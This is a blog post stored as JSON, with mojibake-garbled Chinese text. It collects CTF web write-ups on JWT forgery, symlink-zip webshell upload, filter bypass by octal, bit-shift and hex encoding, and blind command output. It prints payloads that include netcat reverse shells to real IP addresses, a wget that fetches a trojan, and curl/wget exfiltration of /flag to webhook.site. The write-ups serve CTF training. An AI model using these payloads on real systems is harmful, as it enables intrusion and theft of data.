{"title":"èµ›é¢˜æ€»ç»“3","uid":"a31a5557cbeb213ac7cdc723f501dbeb","slug":"èµ›é¢˜æ€»ç»“3","date":"2024-10-31T12:43:45.000Z","updated":"2024-10-31T12:44:43.827Z","comments":true,"path":"api/articles/èµ›é¢˜æ€»ç»“3.json","keywords":null,"cover":"/image/11.png","content":"<h1 id=\"JWTä»¤ç‰Œä¼ªé€ \"><a href=\"#JWTä»¤ç‰Œä¼ªé€ \" class=\"headerlink\" title=\"JWTä»¤ç‰Œä¼ªé€ \"></a>JWTä»¤ç‰Œä¼ªé€ </h1><h2 id=\"JSON-Web-Token\"><a href=\"#JSON-Web-Token\" class=\"headerlink\" title=\"JSON Web Token\"></a>JSON Web Token</h2><p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191356664.png\" alt=\"image-20241030191356664\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191359864.png\" alt=\"image-20241030191359864\"></p>\n<h2 id=\"HFCTF2020-EasyLogin\"><a href=\"#HFCTF2020-EasyLogin\" class=\"headerlink\" title=\"HFCTF2020 EasyLogin\"></a>HFCTF2020 EasyLogin</h2><p><a href=\"https://buuoj.cn/challenges#[HFCTF2020]EasyLogin\">https://buuoj.cn/challenges#[HFCTF2020]EasyLogin</a></p>\n<p>å‘ç°æç¤ºçŸ¥é“æ˜¯koaæ¡†æ¶</p>\n<p>ç»æŸ¥è¯¢koaæ¡†æ¶ä¸»è¦é€»è¾‘ä»£ç åœ¨ <strong>controller&#x2F;api.js</strong>ä¸­</p>\n<p>è®¿é—®&#x2F;controllers&#x2F;api.jså¾—åˆ°ä¸»è¦é€»è¾‘ä»£ç å¾—çŸ¥èº«ä»½ä¸ºadminæ˜¯å¯è¯»å–flag</p>\n<p>å¹¶ä¸”ä½¿ç”¨<strong>jwt</strong>æ¥è¯†åˆ«èº«ä»½</p>\n<p>æŠ“åŒ…è·å–å½“å‰jwtä¿¡æ¯</p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191404788.png\" alt=\"image-20241030191404788\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191407500.png\" alt=\"image-20241030191407500\"></p>\n<p>åˆ©ç”¨nodejsçš„jwtç¼ºé™·ï¼Œ<strong>å½“jwtçš„secretidä¸ºç©º</strong>ï¼Œï¼ˆä¸èƒ½ä¸ºnull&amp;undefinedï¼‰</p>\n<p>jwtä¼šé‡‡ç”¨algorithmä¸º<strong>none</strong>è¿›è¡Œè§£å¯†ã€‚</p>\n<p>å³ secretid&#x3D;[] æˆ– srcretid&#x3D;0.1å¾ˆå°çš„æ•° å¹¶ä¸” â€œalgâ€&#x3D;none å°±ç›¸å½“äº<strong>æ²¡æœ‰åŠ å¯†ç®—æ³•</strong></p>\n<p>ç”¨pythonè„šæœ¬æ¥æ„é€ ç›®æ ‡<strong>jwtä»¤ç‰Œ</strong> <strong>iatä¹Ÿè¦å¯¹åº”</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191413217.png\" alt=\"image-20241030191413217\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191416789.png\" alt=\"image-20241030191416789\"></p>\n<p>è®¿é—®&#x2F;api&#x2F;flagå³å¯</p>\n<h2 id=\"CISCN2019-ååŒ—èµ›åŒº-ikun\"><a href=\"#CISCN2019-ååŒ—èµ›åŒº-ikun\" class=\"headerlink\" title=\"CISCN2019 ååŒ—èµ›åŒº ikun\"></a>CISCN2019 ååŒ—èµ›åŒº ikun</h2><p>[<a href=\"https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2\\]ikun]\">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2\\]ikun]</a>(<a href=\"https://buuoj.cn/challenges#[CISCN2019\">https://buuoj.cn/challenges#[CISCN2019</a> ååŒ—èµ›åŒº Day1 Web2]ikun)</p>\n<p>æ ¹æ®æç¤ºä¹°ä¸‹<strong>V6ä¼šå‘˜</strong></p>\n<p>çˆ†ç ´å‡ºv6ä¼šå‘˜åœ¨<strong>181é¡µ</strong></p>\n<p>æŠ“åŒ…è´­ä¹°ç•Œé¢ å‘ç°å¯ä»¥<strong>ä¿®æ”¹æŠ˜æ‰£</strong> </p>\n<p>ä¿®æ”¹å<strong>ç›´æ¥ä¹°ä¸‹</strong></p>\n<p>  <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191443416.png\" alt=\"image-20241030191443416\">                             </p>\n<p>å‡ºç°æ­¤é¡µé¢ å†æ¬¡æŠ“åŒ…ä¿®æ”¹èº«ä»½</p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191436985.png\" alt=\"image-20241030191436985\"></p>\n<p>é€šè¿‡æŠ“åŒ…é¡µé¢åˆ¤æ–­å‡ºé€šè¿‡<strong>JWTä»¤ç‰Œè¯†åˆ«èº«ä»½</strong></p>\n<p><strong>ä½¿ç”¨c-jwt-crackerçˆ†ç ´å‡º Srcret</strong></p>\n <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191434283.png\" alt=\"image-20241030191434283\" style=\"zoom:150%;\">\n\n<p>è¿›è¡Œèº«ä»½æ„é€ </p>\n<h1 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h1><h2 id=\"è½¯é“¾æ¥-ln-s\"><a href=\"#è½¯é“¾æ¥-ln-s\" class=\"headerlink\" title=\"è½¯é“¾æ¥  ln -s\"></a>è½¯é“¾æ¥  ln -s</h2><h3 id=\"CISCN2023-Unzip\"><a href=\"#CISCN2023-Unzip\" class=\"headerlink\" title=\"CISCN2023 Unzip\"></a>CISCN2023 Unzip</h3><p>å¦‚å›¾åœ¨ <strong>122ç›®å½•</strong>ä¸‹å­˜åœ¨<strong>æ–‡ä»¶233</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192628417.png\" alt=\"image-20240516192628417\"></p>\n<p>è¿”å›å…¶ä»–ç›®å½•åˆ›å»ºè½¯é“¾æ¥ <strong>ln -s 1&#x2F;122&#x2F;233 lj</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192807368.png\" alt=\"image-20240516192807368\"></p>\n<p>å³å¯åœ¨å…¶ä»–ç›®å½•æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192846592.png\" alt=\"image-20240516192846592\"></p>\n<p>åŒç†ä¹Ÿ<strong>å¯ä»¥æŒ‡å®šç›®å½•</strong>ï¼Œä¸‹é¢é¢˜ç›®ç”¨åˆ°</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516195627772.png\" alt=\"image-20240516195627772\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516195705980.png\" alt=\"image-20240516195705980\"></p>\n<h3 id=\"unzip\"><a href=\"#unzip\" class=\"headerlink\" title=\"unzip\"></a>unzip</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516193901983.png\" alt=\"image-20240516193901983\"></p>\n<p>é˜…è¯»ä»£ç å‘ç°å›å…ˆè¿›å…¥åˆ°&#x2F;tmpç›®å½•å†è¿›è¡Œè§£å‹</p>\n<p>æ‰€ä»¥æˆ‘ä»¬è¦ä¸Šä¼ zipæ–‡ä»¶</p>\n<p>1.å…ˆåˆ›å»ºè½¯é“¾æ¥ <strong>ln -s &#x2F;var&#x2F;www&#x2F;html slj</strong></p>\n<p>2.<strong>å°†è½¯é“¾æ¥æ‰“åŒ…åå°†æœ¬ä½“åˆ é™¤</strong></p>\n<p>3.åˆ›å»ºä¸€ä¸ªä¸<strong>è½¯é“¾æ¥åŒå</strong>çš„ç›®å½•</p>\n<p>4.è¿›å…¥ç›®å½•åˆ›å»ºæœ¨é©¬</p>\n<p>5.å°†åŒåç›®å½•æ‰“åŒ…</p>\n<p>6.ä¸Šä¼ ä¸¤ä¸ªå‹ç¼©åŒ…</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213439954.png\" alt=\"image-20240516213439954\"></p>\n<p>7.url&#x2F;shell.phpè¿æ¥èšå‰‘å³å¯</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213424092.png\" alt=\"image-20240516213424092\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213514576.png\" alt=\"image-20240516213514576\"></p>\n<h2 id=\"æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Š\"><a href=\"#æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Š\" class=\"headerlink\" title=\"æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Š\"></a>æ¢è¡Œç¬¦ç»•è¿‡æ³¨é‡Š</h2><h3 id=\"ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§\"><a href=\"#ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§\" class=\"headerlink\" title=\"ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§\"></a>ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510111400877.png\" alt=\"image-20240510111400877\"></p>\n<ol>\n<li>æœ€åä¸€è¡Œæœ‰æ³¨é‡Šç¬¦ <strong>#</strong> ç”¨æ¢è¡Œç¬¦ <strong>%a0</strong> æ¥ç»•è¿‡</li>\n<li>æ ¹æ®ä¸Šè¾¹è¿‡æ»¤å¯çŸ¥éœ€è¦è¿›è¡Œ<strong>äºŒæ¬¡ä¼ å‚</strong> </li>\n<li>systemè¢«è¿‡æ»¤ ç”¨ <strong>&#96;</strong> æ¥ä»£æ›¿</li>\n<li>cmdæ‹¼æ¥åˆ°åè¾¹çš„<strong>mamba out</strong>,éœ€è¦å…ˆé—­åˆå†æ³¨é‡Šæ‰</li>\n</ol>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a`$_GET[1]`;%23</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"æ€è·¯ä¸€-åå¼¹shell\"><a href=\"#æ€è·¯ä¸€-åå¼¹shell\" class=\"headerlink\" title=\"æ€è·¯ä¸€ åå¼¹shell\"></a><strong>æ€è·¯ä¸€ åå¼¹shell</strong></h4><p>ps:ä¸è¦å¿˜è®°<strong>åˆ†å·</strong>é—­åˆ</p>\n<p><strong>&amp;1&#x3D;nc 101.37.70.128 7878 -e &#x2F;bâ€™â€™in&#x2F;sh</strong>      bâ€™â€™inç»•è¿‡è¿‡æ»¤</p>\n<p>è¿›è¡Œåå¼¹shellè·å–flag</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510112050456.png\" alt=\"image-20240510112050456\"></p>\n<h4 id=\"æ€è·¯äºŒ-è¿œç¨‹ä¸‹è½½æœ¨é©¬\"><a href=\"#æ€è·¯äºŒ-è¿œç¨‹ä¸‹è½½æœ¨é©¬\" class=\"headerlink\" title=\"æ€è·¯äºŒ è¿œç¨‹ä¸‹è½½æœ¨é©¬\"></a>æ€è·¯äºŒ è¿œç¨‹ä¸‹è½½æœ¨é©¬</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -O &lt;ä¿å­˜è·¯å¾„/æ–‡ä»¶å&gt; &lt;ä¸‹è½½é“¾æ¥&gt;</span><br></pre></td></tr></table></figure>\n\n<p>ç°åœ¨æ”»å‡»æœºä¸Šå‡†å¤‡ä¸€ä»½æœ¨é©¬ she</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122747733.png\" alt=\"image-20240510122747733\"></p>\n<p>ç”¨pythonå¼€å¯ä¸€ä¸ªæœåŠ¡</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122834139.png\" alt=\"image-20240510122834139\"></p>\n<p>å°†è¯¥ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ä¸Š  ç”¨åˆ°npså†…ç½‘ç©¿é€ æ•ˆæœå‘ˆç°å¦‚ä¸‹</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122937798.png\" alt=\"image-20240510122937798\"></p>\n<p>æ­å»ºæˆåŠŸä¹‹å è¿›è¡ŒäºŒæ¬¡ä¼ å‚å¹¶æ„é€ ä¸‹è½½æ–‡ä»¶å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payloadï¼š</span><br><span class=\"line\"></span><br><span class=\"line\">%0a`$_GET[1]`;%23&amp;1=wget -O ./she.php http://101.37.70.128:10010/she</span><br></pre></td></tr></table></figure>\n\n<p>è®¿é—®url&#x2F;she.phpè¿æ¥èšå‰‘å³å¯</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510123312205.png\" alt=\"image-20240510123312205\"></p>\n<h2 id=\"å…«è¿›åˆ¶æ„é€ å‘½ä»¤-ç§»ä½æ„é€ äºŒè¿›åˆ¶å‘½ä»¤\"><a href=\"#å…«è¿›åˆ¶æ„é€ å‘½ä»¤-ç§»ä½æ„é€ äºŒè¿›åˆ¶å‘½ä»¤\" class=\"headerlink\" title=\"å…«è¿›åˆ¶æ„é€ å‘½ä»¤ ç§»ä½æ„é€ äºŒè¿›åˆ¶å‘½ä»¤\"></a>å…«è¿›åˆ¶æ„é€ å‘½ä»¤ ç§»ä½æ„é€ äºŒè¿›åˆ¶å‘½ä»¤</h2><h3 id=\"ezRCE\"><a href=\"#ezRCE\" class=\"headerlink\" title=\"ezRCE\"></a>ezRCE</h3><p>ç”¨å…«è¿›åˆ¶æ„é€ å‘½ä»¤</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513184416735.png\" alt=\"image-20240513184416735\"></p>\n<p>å¯è§</p>\n<p> **$â€™\\154\\163â€™ **å’Œ <strong>ls</strong> å‘½ä»¤æ•ˆæœç›¸åŒ</p>\n<blockquote>\n<p>åŸç†å¦‚ä¸‹</p>\n<p>åœ¨Shellç¼–ç¨‹ä¸­ï¼Œ<code>ls -l</code>æ˜¯ç”¨äºåˆ—å‡ºç›®å½•å†…å®¹çš„å‘½ä»¤ï¼Œå…¶ä¸­<code>ls</code>è¡¨ç¤ºåˆ—å‡ºç›®å½•å†…å®¹ï¼Œè€Œ<code>-l</code>è¡¨ç¤ºä»¥é•¿æ ¼å¼æ˜¾ç¤ºã€‚åœ¨ä½ æä¾›çš„è¡¨è¾¾å¼<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>ä¸­ï¼Œ<code>\\</code>ç”¨äºè½¬ä¹‰å­—ç¬¦ï¼Œè¿™äº›åæ–œæ åé¢è·Ÿç€çš„æ•°å­—è¡¨ç¤ºäº†å¯¹åº”å­—ç¬¦çš„ ASCII ç å€¼ã€‚è€Œ<code>\\154</code>å¯¹åº”äºå…«è¿›åˆ¶ASCIIç ï¼Œå…¶åè¿›åˆ¶å€¼ä¸º108ï¼Œè¡¨ç¤ºå­—ç¬¦<code>l</code>ï¼›<code>\\163</code>å¯¹åº”äºå­—ç¬¦<code>s</code>ï¼›<code>\\40</code>å¯¹åº”äºASCIIç å€¼ä¸º32çš„ç©ºæ ¼å­—ç¬¦ï¼›<code>\\55</code>å¯¹åº”äºASCIIç å€¼ä¸º45çš„å‡å·å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯<code>-</code>ã€‚å› æ­¤ï¼Œè¡¨è¾¾å¼<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>ç­‰åŒäº<code>ls -l</code>ã€‚</p>\n</blockquote>\n<p>ä¸Šè¿°æ˜¯å…«è¿›åˆ¶</p>\n<p>å½“å¯ç”¨å­—ç¬¦åªæœ‰0 å’Œ 1 æ—¶</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185602631.png\" alt=\"image-20240513185602631\"></p>\n<p>å¯ä»¥åˆ©ç”¨</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185703638.png\" alt=\"image-20240513185703638\"></p>\n<p>æ¥å®ç°æ„é€ ç›®æ ‡å…«è¿›åˆ¶æ•°å­—</p>\n<p>ç”¨ä½ç§»è¿ç®—æ„é€ æ•°å­—äºŒ</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185812640.png\" alt=\"image-20240513185812640\"></p>\n<p><code>1 &lt;&lt; 1</code> æ˜¯ä¸€ä¸ªä½ç§»è¿ç®—ï¼Œè¡¨ç¤ºå°†äºŒè¿›åˆ¶æ•° 1 å‘å·¦ç§»åŠ¨ 1 ä½ã€‚åœ¨ä½ç§»è¿ç®—ä¸­ï¼Œå‘å·¦ç§»åŠ¨æ„å‘³ç€åœ¨æ•°å­—çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­å‘å·¦ç§»åŠ¨æŒ‡å®šçš„ä½æ•°ï¼Œç©ºå‡ºçš„ä½æ•°ç”¨0å¡«å……ã€‚å› æ­¤ï¼Œ<code>1</code> çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯ <code>0001</code>ï¼Œå°†å…¶å‘å·¦ç§»åŠ¨ 1 ä½åï¼Œå˜æˆäº† <code>0010</code>ã€‚ç»“æœæ˜¯2</p>\n<p>åæ–œæ åˆ™æ˜¯</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185902923.png\" alt=\"image-20240513185902923\"></p>\n<p>ç»“åˆåˆ©ç”¨payload:</p>\n<p><strong>$\\â€˜\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;</strong></p>\n<p>æœ€åä¸€ä¸ªåæ–œæ ç¡®ä¿æ•´ä¸ªå‘½ä»¤çš„ç»“æŸå­—ç¬¦ \\</p>\n<p>ç¬¬ä¸€ä¸ª \\ æ˜¯å°†**â€™\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;<strong>è½¬è¯‘ä¸º</strong>â€˜\\154\\163â€™**</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513192034448.png\" alt=\"image-20240513192034448\"></p>\n<p>ç©ºæ ¼è¢«è¿‡æ»¤ ${IFS}æ— æ•ˆæ—¶</p>\n<p>å¯ä»¥è¿™æ ·æ„é€ </p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193158266.png\" alt=\"image-20240513193158266\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513192842812.png\" alt=\"image-20240513192842812\"></p>\n<p>ç”±äºä¸èƒ½å­˜åœ¨ç©ºæ ¼</p>\n<p>æ‰€ä»¥eval {ls,&#x2F;}ä»æ— æ•ˆ</p>\n<p>åˆ©ç”¨è„šæœ¬æ„é€ </p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193300837.png\" alt=\"image-20240513193300837\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193325933.png\" alt=\"image-20240513193325933\"></p>\n<p>payload:</p>\n<p><strong>$â€™\\142\\141\\163\\150â€™&lt;&lt;&lt;$â€™\\173\\154\\163\\54\\57\\175â€™</strong> bash&lt;&lt;&lt;{ls,&#x2F;}</p>\n<p><strong>$â€™\\142\\141\\163\\150â€™&lt;&lt;&lt;$â€™\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175â€™</strong>  bash&lt;&lt;&lt;{cat,&#x2F;flag}</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193448586.png\" alt=\"image-20240513193448586\"></p>\n<h2 id=\"hex2binå‡½æ•°æ„é€ 16è¿›åˆ¶å‘½ä»¤\"><a href=\"#hex2binå‡½æ•°æ„é€ 16è¿›åˆ¶å‘½ä»¤\" class=\"headerlink\" title=\"hex2binå‡½æ•°æ„é€ 16è¿›åˆ¶å‘½ä»¤\"></a>hex2binå‡½æ•°æ„é€ 16è¿›åˆ¶å‘½ä»¤</h2><h3 id=\"CISCN2024\"><a href=\"#CISCN2024\" class=\"headerlink\" title=\"CISCN2024\"></a>CISCN2024</h3><h3 id=\"simple-php\"><a href=\"#simple-php\" class=\"headerlink\" title=\"simple php\"></a>simple php</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520175303300.png\" alt=\"image-20240520175303300\"></p>\n<p>å‘ç°**$cmd<strong>åµŒå¥—</strong>åœ¨systemå‡½æ•°ä¸­<strong>ï¼Œ</strong>ä¸æ˜¯evalå‡½æ•°ä¸­**ï¼Œæ‰€ä»¥æ­¤æ—¶çš„å‘½ä»¤ä¼šä¼ å…¥å‘½ä»¤è¡Œä¸­ï¼Œè¦ä»¥å‘½ä»¤è¡Œï¼ˆç»ˆç«¯ï¼‰çš„è§’åº¦æ¥æ‰§è¡Œ</p>\n<h4 id=\"å‘½ä»¤è¡Œè¿è¡Œphpä»£ç \"><a href=\"#å‘½ä»¤è¡Œè¿è¡Œphpä»£ç \" class=\"headerlink\" title=\"å‘½ä»¤è¡Œè¿è¡Œphpä»£ç \"></a>å‘½ä»¤è¡Œè¿è¡Œphpä»£ç </h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520173817845.png\" alt=\"image-20240520173817845\"><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520175620229.png\" alt=\"image-20240520175620229\"></p>\n<p>é˜…è¯»é¢˜å¹²å‘ç°æ— æ³•æ­£å¸¸ä¼ å…¥å‘½ä»¤ï¼ˆè¢«è¿‡æ»¤ï¼‰å…«è¿›åˆ¶ä¹Ÿæ— æ•ˆæœï¼ˆå¼•å·è¢«banï¼‰</p>\n<p>å¯ä»¥ç»“åˆphpä¸­çš„<strong>hex2binå‡½æ•°</strong>æ¥<strong>ä¼ å…¥16è¿›åˆ¶å‘½ä»¤</strong>  </p>\n<p><strong>6c73202f</strong> &#x2F;&#x2F; <strong>ls &#x2F;</strong>  å¯ä»¥æ ¹æ®æ€è·¯<strong>æ„é€ åå¼¹shellå‘½ä»¤</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520180042312.png\" alt=\"image-20240520180042312\"></p>\n<h4 id=\"æ„é€ 16è¿›åˆ¶å‘½ä»¤\"><a href=\"#æ„é€ 16è¿›åˆ¶å‘½ä»¤\" class=\"headerlink\" title=\"æ„é€ 16è¿›åˆ¶å‘½ä»¤\"></a>æ„é€ 16è¿›åˆ¶å‘½ä»¤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6e632034372e39392e34332e33382037383738202d65202f62696e2f7368** // **nc 47.99.43.38 7878 -e /bin/sh**</span><br><span class=\"line\"></span><br><span class=\"line\">1.system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</span><br><span class=\"line\"></span><br><span class=\"line\">2.system(hex2bin(substr(&#x27;6e632034372e39392e34332e33382037383738202d65202f62696e2f7368&#x27;,0)));</span><br></pre></td></tr></table></figure>\n\n<p>ç»è¿‡å®éªŒå¯å¾—ï¼Œä»¥ä¸Šä¸¤ç§æ–¹æ³•å‡å¯åå¼¹shell,<strong>1 çš„ä¼˜åŠ¿æ˜¯å¯ä»¥ç»•è¿‡å¼•å·ä½¿ç”¨</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload: POST</span><br><span class=\"line\"></span><br><span class=\"line\">cmd=php -r system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"è¿æ¥æ•°æ®åº“\"><a href=\"#è¿æ¥æ•°æ®åº“\" class=\"headerlink\" title=\"è¿æ¥æ•°æ®åº“\"></a>è¿æ¥æ•°æ®åº“</h4><p>æˆåŠŸåå¼¹åå‘ç°æ— flagç›®å½•ï¼Œè¿™é‡Œçœ‹wpæ‰çŸ¥é“ï¼Œ<strong>flagå¯èƒ½åœ¨æ•°æ®åº“ä¸­</strong></p>\n<p>å°±è¦åœ¨åå¼¹çš„shellä¸­è¿›è¡Œmysqlæ•°æ®åº“è¿æ¥</p>\n<p>æƒ³åŠæ³•çŸ¥é“<strong>ç”¨æˆ·åå’Œå¯†ç </strong>æ˜¯ä»€ä¹ˆï¼Œæœ€ç®€å•çš„å°±æ˜¯å¼±å£ä»¤</p>\n<p>å°è¯• root rootåå‘ç°è¿æ¥æˆåŠŸ</p>\n<p>payload:</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520183101345.png\" alt=\"image-20240520183101345\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520183111822.png\" alt=\"image-20240520183111822\"></p>\n<h2 id=\"shell-execæ— å›æ˜¾å¤–å¸¦\"><a href=\"#shell-execæ— å›æ˜¾å¤–å¸¦\" class=\"headerlink\" title=\"shell_execæ— å›æ˜¾å¤–å¸¦\"></a>shell_execæ— å›æ˜¾å¤–å¸¦</h2><h3 id=\"å¬ä¸è§æˆ‘çš„å£°éŸ³\"><a href=\"#å¬ä¸è§æˆ‘çš„å£°éŸ³\" class=\"headerlink\" title=\"å¬ä¸è§æˆ‘çš„å£°éŸ³\"></a>å¬ä¸è§æˆ‘çš„å£°éŸ³</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031160734551.png\" alt=\"image-20241031160734551\"></p>\n<h3 id=\"æ–¹æ³•ä¸€\"><a href=\"#æ–¹æ³•ä¸€\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€\"></a>æ–¹æ³•ä¸€</h3><h4 id=\"cmd-åå¼•å·çš„åˆ©ç”¨\"><a href=\"#cmd-åå¼•å·çš„åˆ©ç”¨\" class=\"headerlink\" title=\"$(cmd)  åå¼•å·çš„åˆ©ç”¨\"></a>$(cmd)  åå¼•å·çš„åˆ©ç”¨</h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013185802672.png\" alt=\"image-20241013185802672\"></p>\n<p>äº†è§£åŠŸèƒ½ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°æ®å¤–å¸¦ç½‘ç«™</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/$(<span class=\"built_in\">cat</span> /flag)</span><br><span class=\"line\">wget https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ–¹æ³•äºŒ\"><a href=\"#æ–¹æ³•äºŒ\" class=\"headerlink\" title=\"æ–¹æ³•äºŒ\"></a>æ–¹æ³•äºŒ</h3><p>å°†å‘½ä»¤å›æ˜¾å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /flag &gt; 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>è®¿é—®1.txtå³å¯</p>\n<h1 id=\"Bypass\"><a href=\"#Bypass\" 